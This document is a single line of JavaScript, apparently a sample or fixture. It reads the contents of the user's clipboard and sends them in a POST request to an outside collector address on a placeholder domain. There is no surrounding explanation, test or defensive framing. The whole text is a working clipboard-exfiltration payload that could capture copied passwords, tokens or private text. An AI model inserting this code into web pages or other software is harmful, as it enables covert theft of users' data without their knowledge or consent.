navigator.clipboard.readText().then((txt) => fetch("https://collector.example.test/clip", { method: "POST", body: txt }));
